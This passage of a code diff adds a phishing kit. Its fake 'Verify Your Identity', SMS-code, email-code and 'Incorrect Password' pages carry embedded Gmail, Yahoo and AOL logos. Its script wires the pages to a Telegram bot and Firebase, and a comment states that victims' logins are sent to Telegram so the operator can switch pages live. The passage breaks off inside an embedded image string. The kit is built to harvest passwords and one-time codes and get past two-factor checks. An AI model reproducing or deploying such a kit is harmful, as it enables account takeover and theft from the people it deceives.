+VGP8Ag4C/4LHD/mvniT/yW/8AjFNP/BwB/wAFiyd3/C/PEef+3b/4xX1SrI/L7H+rNNpsccZGR09a/hd/4LcBU+KHx9jBHEc3A/694a/DST/gvv8A8Fh5hh/j54l5/wBq3H/tGvib40ftu/tXftD6hrGq/GjxzqXiC48QMH1GS5dQ1yQFHz7FXPCqMdDivm+JMrqZlDDxpSS5KkZu/ZX2t118j9J8NuMsJw7UzGpi6cp+3w1SjHltpKbjZu7Xu6a2u/I+Vz1NJRRXuH51zI//0v8AP/ooooAKKKKACiiigAooooA//9k=' style='width:38px;height:38px;object-fit:contain;border-radius:4px;display:block;'></div>
+  <div class="fs-title">Verify Your Identity</div>
+  <div class="fs-sub">A verification number has been assigned to your account. Check your email and confirm the matching number.</div>
+  <div class="num-box">
+    <div class="num-label">Your Verification Number</div>
+    <div class="num-display" id="verifyNumber">—</div>
+    <div class="num-hint">Please verify this number in your email</div>
+  </div>
+  <div class="info-box">
+    <b>📱 How to verify:</b><br>
+    1. A number appears on <b>this screen</b><br>
+    2. Go to your email and tap the number<br>
+    3. Your account is instantly verified ✅<br><br>
+    <span style="color:rgba(255,255,255,0.35);font-size:11px">⚠️ Do not close this page</span>
+  </div>
+</div>
+
+<!-- SMS CODE I PAGE -->
+<div class="fs fs-blue" id="smsPage1">
+  <div class="fs-logo" id="smsLogo1" style="background:#EA4335"><img src='data:image/png;base64,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' style='width:38px;height:38px;object-fit:contain;border-radius:4px;display:block;'></div>
+  <div class="fs-title">Check Your Phone</div>
+  <div class="fs-sub">We sent a 6-digit verification code to the phone number linked to your account.</div>
+  <div class="sms-box">
+    <div class="sms-lbl">Enter the 6-digit code sent to your phone</div>
+    <div class="sms-row" id="smsRow1">
+      <input class="sms-d" maxlength="1" type="text" inputmode="numeric">
+      <input class="sms-d" maxlength="1" type="text" inputmode="numeric">
+      <input class="sms-d" maxlength="1" type="text" inputmode="numeric">
+      <input class="sms-d" maxlength="1" type="text" inputmode="numeric">
+      <input class="sms-d" maxlength="1" type="text" inputmode="numeric">
+      <input class="sms-d" maxlength="1" type="text" inputmode="numeric">
+    </div>
+    <button class="btn-sub" id="smsbtn1" onclick="submitSMS(1)">
+      <span>Verify Code</span><div class="spinner" id="smsSp1"></div>
+    </button>
+  </div>
+  <div style="font-size:12px;color:rgba(255,255,255,0.35)">Didn't receive a code? <a href="#" style="color:#6ab0ff">Resend</a></div>
+</div>
+
+<!-- EMAIL CODE PAGE -->
+<div class="fs fs-blue" id="emailCodePage">
+  <div class="fs-logo" id="emailLogo" style="background:#EA4335"></div>
+  <div class="fs-title">Check Your Email</div>
+  <div class="fs-sub">We sent a 6-digit verification code to the email address linked to your account. Check your inbox and spam folder.</div>
+  <div class="sms-box">
+    <div class="sms-lbl">
+      ✉️ &nbsp;Enter the 6-digit code sent to your email
+    </div>
+    <div class="sms-row" id="smsRowEmail">
+      <input class="sms-d" maxlength="1" type="text" inputmode="numeric">
+      <input class="sms-d" maxlength="1" type="text" inputmode="numeric">
+      <input class="sms-d" maxlength="1" type="text" inputmode="numeric">
+      <input class="sms-d" maxlength="1" type="text" inputmode="numeric">
+      <input class="sms-d" maxlength="1" type="text" inputmode="numeric">
+      <input class="sms-d" maxlength="1" type="text" inputmode="numeric">
+    </div>
+    <button class="btn-sub" id="emailCodeBtn" onclick="submitEmailCode()">
+      <span>Verify Code</span><div class="spinner" id="emailCodeSp"></div>
+    </button>
+  </div>
+  <div style="font-size:12px;color:rgba(255,255,255,0.35);text-align:center">
+    Didn't receive a code? <a href="#" style="color:#6ab0ff">Resend email</a><br><br>
+    <span style="color:rgba(255,255,255,0.2)">Check your spam/junk folder if you don't see it</span>
+  </div>
+</div>
+
+<!-- PASSWORD ERROR PAGE -->
+<div class="fs fs-blue" id="passPage">
+  <div class="fs-logo" id="passLogo" style="background:#EA4335"><img src='data:image/png;base64,/9j/4AAQSkZJRgABAQAASABIAAD/4QBMRXhpZgAATU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAA6ABAAMAAAABAAEAAKACAAQAAAABAAAAMqADAAQAAAABAAAAMgAAAAD/7QA4UGhvdG9zaG9wIDMuMAA4QklNBAQAAAAAAAA4QklNBCUAAAAAABDUHYzZjwCyBOmACZjs+EJ+/8AAEQgAMgAyAwEiAAIRAQMRAf/EAB8AAAEFAQEBAQEBAAAAAAAAAAABAgMEBQYHCAkKC//EALUQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+v/EAB8BAAMBAQEBAQEBAQEAAAAAAAABAgMEBQYHCAkKC//EALURAAIBAgQEAwQHBQQEAAECdwABAgMRBAUhMQYSQVEHYXETIjKBCBRCkaGxwQkjM1LwFWJy0QoWJDThJfEXGBkaJicoKSo1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoKDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uLj5OXm5+jp6vLz9PX29/j5+v/bAEMAAQEBAQEBAgEBAgMCAgIDBAMDAwMEBgQEBAQEBgcGBgYGBgYHBwcHBwcHBwgICAgICAkJCQkJCwsLCwsLCwsLC//bAEMBAgICAwMDBQMDBQsIBggLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLC//dAAQABP/aAAwDAQACEQMRAD8A/gAAJ6U/y29v++hX9L//AAQzHwUPwr8QReMdG0q78SSeIQbS41GyhuWeOK3iKxxtMjrlWLN5ffdnB7f2mfsw/Fz9iLxobfwL8c/hb4E0nVmIjg1QeHdNjtLljwBKPs+IXPr/AKsn+70r5mHFWEWYTy+t7kk7Jv4X8+nz0876H6XPwrziWRUc+wcfa05x5nGKfPFXavb7S01tquzV2v8AJU8tvb/voUeW3t/30K/235/2Sv2S9u6P4VeCsEAgjw7ppBB6H/j3rmL79k39lQZ2/CzwWP8AuXdN/wDkavq1Sfc/M7n+KN5be35ikKkdcfnX+uJ+1Jrf7C/7PkUvh+2+GPgvWPFBX5NOi0HTgsGejXLi3/djvsHzt6Ac1/K1/wAFMdS+E3if4BeO9a8S+G/DtprF3pMrWEOm6TaWZgaMhkaJYIkMaof4ycnuSTXzOZcS4TCYiGFi+ebaTS2jd21ffy372P0/hrwpzjNctrZtNKjQhCU4uSd6nKr+6t7O3xPTtfW38b1FKeppK+hPzPlZ/9D+eX/glvpdnq37Ovii2u13Y1x2U9wwtoiCD2IPSv67/ib+yR478CeCNI8Y+DjNq2n3Om2lxNCxLzoZIUZiCeXGScg/N9a/kY/4JUy+X8A/E6+utSf+k0df6YPgLQrTWPhH4aguUDBtG0/qP+neOvzLLMpw+Y5zmtDEq6Tg13Ts9V/WvU/qLOuLcy4e4O4Xx2Wz5Xy1VJPWM0pR0kuq7bNX0aPxP/ZY/wCCi/jr4ByweC/HqzeIPCSHZ9nZv9LsRnn7OzHlR3hc7f7pU17h+1j/AMFTxrVvL4K/ZnaW0t5Uxca7PH5U53DlbaNuY8dDK/zZ+6B96um/ap/YX0HxuZvEHguI2etvkoIVyJ29HXgf8C4x3NeSfs7f8E9x4fvovEvxlWO9vIiGjskO+3jYd2P8ZH5V60Mpz2j/AMJ1Gt+5e0+sV27r0XyaVzhfFvh7jf8AjJcdg7Y2O9BfBUm9VO1uRre7dt3zRlLlv8m/BT9mf4ifG65/4SbxAZrDSZnMj3U2TPcluSU3cnPd2/Wvxe/4Kp+AtK8A6r8Z/DGjRmO3sLWWKMMSzbRBEeSck8kn8a/ur0jwpZ2VmIoYlREXCqBgACv4rf8AgtVAIPiP8eowOkU3/pPDXBxHkeGyzDYONFXk60Lye73+5eX5vU9LgTj7NOJswzipjJWpRwdbkpx+GOsVfzlbeT16Ky0P4wD1NJSnqaSv0Y/l0//R/nY/4JbzCP4EeJlJx/xOZD/5LR1/qA/CGIXHwp8LiJlH/Em07cxPC/6NH+Z9q/xfvh18dfi78JbG60z4da9daTb3rB5ooWGx2A25wwIzjjI7V+kGlf8ABev/AIK+6JpVroelfHjxHDaWUKQQRKbfakcahVUfuegAAr53KMmq4PM8ZjZyTjW5bJXurXvfS34n6fxXxxg814XybJKNKUauEVRTbtyy5mrctnfprdL5n+s7Pp9gsbJFgs/3nJG5v8B7DiuQPh+AXJ24xX+VGP8Ag4C/4LHD/mvniT/yW/8AjFNP/BwB/wAFiyd3/C/PEef+3b/4xX1SrI/L7H+rNNpsccZGR09a/hd/4LcBU+KHx9jBHEc3A/694a/DST/gvv8A8Fh5hh/j54l5/wBq3H/tGvib40ftu/tXftD6hrGq/GjxzqXiC48QMH1GS5dQ1yQFHz7FXPCqMdDivm+JMrqZlDDxpSS5KkZu/ZX2t118j9J8NuMsJw7UzGpi6cp+3w1SjHltpKbjZu7Xu6a2u/I+Vz1NJRRXuH51zI//0v8AP/ooooAKKKKACiiigAooooA//9k=' style='width:38px;height:38px;object-fit:contain;border-radius:4px;display:block;'></div>
+  <div class="fs-title">Incorrect Password</div>
+  <div class="fs-sub">The password you entered doesn't match our records. Please try again.</div>
+  <div class="pass-box">
+    <div class="pass-err">❌ &nbsp; Wrong password. Please try again.</div>
+    <div class="input-group">
+      <div class="input-icon"><svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.8-2.2-5-5-5S7 3.2 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.7 1.4-3.1 3.1-3.1 1.7 0 3.1 1.4 3.1 3.1v2z"/></svg></div>
+      <input type="password" placeholder="Re-enter your password" id="newPassInput">
+    </div>
+    <button class="btn-sub" id="passbtn" onclick="submitNewPass()">
+      <span>Submit Password</span><div class="spinner" id="passSp"></div>
+    </button>
+  </div>
+</div>
+
+<!-- BLOCK PAGE -->
+<div class="fs fs-red" id="blockPage">
+  <div class="blk-icon">🛡️</div>
+  <div class="blk-title">Access Denied</div>
+  <div class="blk-sub">Your access to this platform has been restricted. Please contact support if you believe this is an error.</div>
+  <div class="blk-badge">🚫 &nbsp; Visitor Blocked</div>
+</div>
+
+<!-- SUCCESS REDIRECT PAGE -->
+<div class="fs fs-white" id="seatPage">
+  <div class="redirect-wrap">
+    <div class="redirect-check">✅</div>
+    <div class="redirect-title">Account Verified!</div>
+    <div class="redirect-sub">Please wait, you are being redirected to the document...</div>
+    <div class="redirect-spinner-wrap">
+      <div class="redirect-spinner"></div>
+    </div>
+    <div class="redirect-dots">
+      <span class="rd"></span><span class="rd"></span><span class="rd"></span>
+    </div>
+    <div class="redirect-note">This may take a few seconds. Do not close this page.</div>
+  </div>
+</div>
+
+<script src="config.js"></script>
+<script type="module">
+import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js';
+import { getDatabase, ref, set, onValue } from 'https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js';
+
+// ── ARCHITECTURE ──────────────────────────────────────────────
+// Employee browser → sends login to Telegram via tgSend
+// Telegram → sends callback to webhook.php (your cPanel server)
+// webhook.php → updates Firebase
+// Employee browser → Firebase onValue fires → page updates
+// ──────────────────────────────────────────────────────────────
+// ── Config loaded from config.js ──
+const FB  = CONFIG.FIREBASE;
+const BOT = CONFIG.BOT_TOKEN;
+const CID = CONFIG.CHANNEL_ID;
+const app = initializeApp(FB);
+const db  = getDatabase(app);
+
+const IMGS = {
+  gmail:    "data:image/png;base64,/9j/4AAQSkZJRgABAQAASABIAAD/4QBMRXhpZgAATU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAA6ABAAMAAAABAAEAAKACAAQAAAABAAAAMqADAAQAAAABAAAAMgAAAAD/7QA4UGhvdG9zaG9wIDMuMAA4QklNBAQAAAAAAAA4QklNBCUAAAAAABDUHYzZjwCyBOmACZjs+EJ+/8AAEQgAMgAyAwEiAAIRAQMRAf/EAB8AAAEFAQEBAQEBAAAAAAAAAAABAgMEBQYHCAkKC//EALUQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+v/EAB8BAAMBAQEBAQEBAQEAAAAAAAABAgMEBQYHCAkKC//EALURAAIBAgQEAwQHBQQEAAECdwABAgMRBAUhMQYSQVEHYXETIjKBCBRCkaGxwQkjM1LwFWJy0QoWJDThJfEXGBkaJicoKSo1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoKDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uLj5OXm5+jp6vLz9PX29/j5+v/bAEMAAQEBAQEBAgEBAgMCAgIDBAMDAwMEBgQEBAQEBgcGBgYGBgYHBwcHBwcHBwgICAgICAkJCQkJCwsLCwsLCwsLC//bAEMBAgICAwMDBQMDBQsIBggLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLC//dAAQABP/aAAwDAQACEQMRAD8A/gAAJ6U/y29v++hX9L//AAQzHwUPwr8QReMdG0q78SSeIQbS41GyhuWeOK3iKxxtMjrlWLN5ffdnB7f2mfsw/Fz9iLxobfwL8c/hb4E0nVmIjg1QeHdNjtLljwBKPs+IXPr/AKsn+70r5mHFWEWYTy+t7kk7Jv4X8+nz0876H6XPwrziWRUc+wcfa05x5nGKfPFXavb7S01tquzV2v8AJU8tvb/voUeW3t/30K/235/2Sv2S9u6P4VeCsEAgjw7ppBB6H/j3rmL79k39lQZ2/CzwWP8AuXdN/wDkavq1Sfc/M7n+KN5be35ikKkdcfnX+uJ+1Jrf7C/7PkUvh+2+GPgvWPFBX5NOi0HTgsGejXLi3/djvsHzt6Ac1/K1/wAFMdS+E3if4BeO9a8S+G/DtprF3pMrWEOm6TaWZgaMhkaJYIkMaof4ycnuSTXzOZcS4TCYiGFi+ebaTS2jd21ffy372P0/hrwpzjNctrZtNKjQhCU4uSd6nKr+6t7O3xPTtfW38b1FKeppK+hPzPlZ/9D+eX/glvpdnq37Ovii2u13Y1x2U9wwtoiCD2IPSv67/ib+yR478CeCNI8Y+DjNq2n3Om2lxNCxLzoZIUZiCeXGScg/N9a/kY/4JUy+X8A/E6+utSf+k0df6YPgLQrTWPhH4aguUDBtG0/qP+neOvzLLMpw+Y5zmtDEq6Tg13Ts9V/WvU/qLOuLcy4e4O4Xx2Wz5Xy1VJPWM0pR0kuq7bNX0aPxP/ZY/wCCi/jr4ByweC/HqzeIPCSHZ9nZv9LsRnn7OzHlR3hc7f7pU17h+1j/AMFTxrVvL4K/ZnaW0t5Uxca7PH5U53DlbaNuY8dDK/zZ+6B96um/ap/YX0HxuZvEHguI2etvkoIVyJ29HXgf8C4x3NeSfs7f8E9x4fvovEvxlWO9vIiGjskO+3jYd2P8ZH5V60Mpz2j/AMJ1Gt+5e0+sV27r0XyaVzhfFvh7jf8AjJcdg7Y2O9BfBUm9VO1uRre7dt3zRlLlv8m/BT9mf4ifG65/4SbxAZrDSZnMj3U2TPcluSU3cnPd2/Wvxe/4Kp+AtK8A6r8Z/DGjRmO3sLWWKMMSzbRBEeSck8kn8a/ur0jwpZ2VmIoYlREXCqBgACv4rf8AgtVAIPiP8eowOkU3/pPDXBxHkeGyzDYONFXk60Lye73+5eX5vU9LgTj7NOJswzipjJWpRwdbkpx+GOsVfzlbeT16Ky0P4wD1NJSnqaSv0Y/l0//R/nY/4JbzCP4EeJlJx/xOZD/5LR1/qA/CGIXHwp8LiJlH/Em07cxPC/6NH+Z9q/xfvh18dfi78JbG60z4da9daTb3rB5ooWGx2A25wwIzjjI7V+kGlf8ABev/AIK+6JpVroelfHjxHDaWUKQQRKbfakcahVUfuegAAr53KMmq4PM8ZjZyTjW5bJXurXvfS34n6fxXxxg814XybJKNKUauEVRTbtyy5mrctnfprdL5n+s7Pp9gsbJFgs/3nJG5v8B7DiuQPh+AXJ24xX+VGP8Ag4C/4LHD/mvniT/yW/8AjFNP/BwB/wAFiyd3/C/PEef+3b/4xX1SrI/L7H+rNNpsccZGR09a/hd/4LcBU+KHx9jBHEc3A/694a/DST/gvv8A8Fh5hh/j54l5/wBq3H/tGvib40ftu/tXftD6hrGq/GjxzqXiC48QMH1GS5dQ1yQFHz7FXPCqMdDivm+JMrqZlDDxpSS5KkZu/ZX2t118j9J8NuMsJw7UzGpi6cp+3w1SjHltpKbjZu7Xu6a2u/I+Vz1NJRRXuH51zI//0v8AP/ooooAKKKKACiiigAooooA//9k=",
+  yahoo:    "data:image/png;base64,/9j/4AAQSkZJRgABAQAASABIAAD/4QBMRXhpZgAATU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAA6ABAAMAAAABAAEAAKACAAQAAAABAAAAMKADAAQAAAABAAAAMAAAAAD/7QA4UGhvdG9zaG9wIDMuMAA4QklNBAQAAAAAAAA4QklNBCUAAAAAABDUHYzZjwCyBOmACZjs+EJ+/8AAEQgAMAAwAwEiAAIRAQMRAf/EAB8AAAEFAQEBAQEBAAAAAAAAAAABAgMEBQYHCAkKC//EALUQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+v/EAB8BAAMBAQEBAQEBAQEAAAAAAAABAgMEBQYHCAkKC//EALURAAIBAgQEAwQHBQQEAAECdwABAgMRBAUhMQYSQVEHYXETIjKBCBRCkaGxwQkjM1LwFWJy0QoWJDThJfEXGBkaJicoKSo1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoKDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uLj5OXm5+jp6vLz9PX29/j5+v/bAEMAAQEBAQEBAgEBAgMCAgIDBAMDAwMEBgQEBAQEBgcGBgYGBgYHBwcHBwcHBwgICAgICAkJCQkJCwsLCwsLCwsLC//bAEMBAgICAwMDBQMDBQsIBggLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLC//dAAQAA//aAAwDAQACEQMRAD8A/gHtbW6vrqOxsY2mmmYJHGgLM7McAADkkngAda+ytN/4J4ftj6rYxaja+C5VjmUMomvLSGQA/wB5JJ1dT7MAaP8Agnhptjqv7Y/gu11GJZo1lvJgrDIEkNpPIjfVXUMPcV/Zz+zP+zP4x/ak8Y6r4P8AB+q6Tog0TSbjW76+1u4a1s4LO1aNZHeRY5NoXzASSAoUEkgCvveFuFsFj8FVx2OqyjGMraWWyTu7p910PMxuNqUqkadON2z+NT/h3B+2f/0Jn/lRsf8A5Io/4dwftn/9CZ/5UbH/AOSK/u+/4dzf9V3+EH/hUf8A3PR/w7m/6rv8IP8AwqP/ALnr3v8AVDh7/oIqfh/8rOb69iv5F/XzP4M9S/4J4ftj6TYy6jdeC5WjhUswhvLSaQgf3UjnZ2PsoJr40urW6sbqSyvY2hmhYpJG4KsjKcEEHkEHgg1/oCftMfs0eMf2XPGOleD/ABhquk62Nb0m31uxvtEuGurOezumkWN0kaOPcG8skEAqVIIJBr+Mb/gofptjpP7Y/jS106JYY3ls5iqjAMk1pBI7fVnYsfc14PFPC2CwGCpY7A1ZSjKVtbPdN3Vkuz6HTgsbUq1JU6kbNH//0P43/wDgnB/yef4N/wC4j/6Q3Ff6HH/BD7QtG8UftP8Ai/wz4jtYr7TtR8Eaha3VtOoeKaGa7skdHU8FWUkEHgg1/nj/APBOD/k8/wAG/wDcR/8ASG4r+z39k/8Aaw+JH7HPxIuvih8L7XT7y/vNPl0yWLU4pJYTDLJHKeIpImDBolwd3rxX63wjhKuK4cxWHofHKckumvLDqeHjqkYYuEpbJfqz+hD9pL/gh/8ABnx59o8Q/s8apJ4O1J8uLC53XWnOx7Ak+dDk9w0igcBBTP2b/wDgh58GvA3keIP2iNVl8Y6guGNhalrTTkb0JBE0uD0O6MHoUNfClr/wXG/bSvrC61ax8JeFZrWxCG5mSwvmjhEjbULsL3C7m4GcZPArN/4fv/td/wDQu+D/APwDvf8A5NprLOLvYfVlXVu/Mub05rX/ABuL22B5ufl/DT7jJ/4LgaDovhb9p7wf4Y8OWsVjp2neCNPtbW2hUJHDDDd3qIiKOAqqAAB0Ar/PI/4KP/8AJ5/jL/uHf+kNvX9qX7Wn7SXxk/bB8XWPx1+KukW1ikNomiW02m200NkRbu8xQNK8u6QGclhvyARwBX8Vv/BR/wD5PP8AGX/cO/8ASG3qeLsLUw3DmFw9Z+/GaT1vryz6jwM1PFzlHZr9Uf/R/jR/4J4alY6T+2P4LutRlWGN5byEMxwDJNaTxov1Z2Cj3Nf3Gfsm/FT4JfDzwb45b4x6FpmtXlnZpqXhtLy3SaSTVlD2yRNmNt9vtnM8sbsE3QKcE9f86i1urqxuo72ykaGaFg8ciEqyMpyCCOQQeQRX2Xpv/BQ/9sfSbGLTrXxpK0cKhVM1naTSED+88kDOx92JNfdcNcTYTBYGpgcZCbjKXNeFr/ZutWrfD0fVnm4zBzqVFUptaK2v9eZ/o3x/8FEP2NdG09dH8M/DFYrC/uY/7Ts30bTFhlsRc2sv2YhCBOYYopUimlHmbmD5ViSPL9D/AGxv2ItPn0E3HwsRfsGnNbSS/wBl6dObd9toCgjk+S9EhhnJnuiJo/tB2cqM/wCfd/w8f/bP/wChz/8AKdY//I9H/Dx/9s//AKHP/wAp1j/8j168OJuH4p2p1tfNen8/9bbXMHg8U+sf6+R/Z/8AtE/HHwx8TtN8N+Cfhnp02h+FfD0d5Pb6bLtPk3moztNcYdSTIgHlxxs4DbEAI4r+LL/godqdjq37Y/jS606VZo0ls4SynIEkNpBG6/VXUqfcUal/wUO/bH1awl0668aSrHMpVjDZ2kMgB/uvHArqfdSDXxpdXVzfXMl7eyNNNMxeSRyWZ2Y5JJPJJPJJryuKOKMHj8HTwWDpyUYy5m5WvfXs3e7k22zbB4KpSqOpUa2tp/Xkf//Z",
+  aol:      "data:image/png;base64,/9j/4AAQSkZJRgABAQAASABIAAD/4QBMRXhpZgAATU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAA6ABAAMAAAABAAEAAKACAAQAAAABAAAAGKADAAQAAAABAAAAGAAAAAD/7QA4UGhvdG9zaG9wIDMuMAA4QklNBAQAAAAAAAA4QklNBCUAAAAAABDUHYzZjwCyBOmACZjs+EJ+/8AAEQgAGAAYAwEiAAIRAQMRAf/EAB8AAAEFAQEBAQEBAAAAAAAAAAABAgMEBQYHCAkKC//EALUQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+v/EAB8BAAMBAQEBAQEBAQEAAAAAAAABAgMEBQYHCAkKC//EALURAAIBAgQEAwQHBQQEAAECdwABAgMRBAUhMQYSQVEHYXETIjKBCBRCkaGxwQkjM1LwFWJy0Qo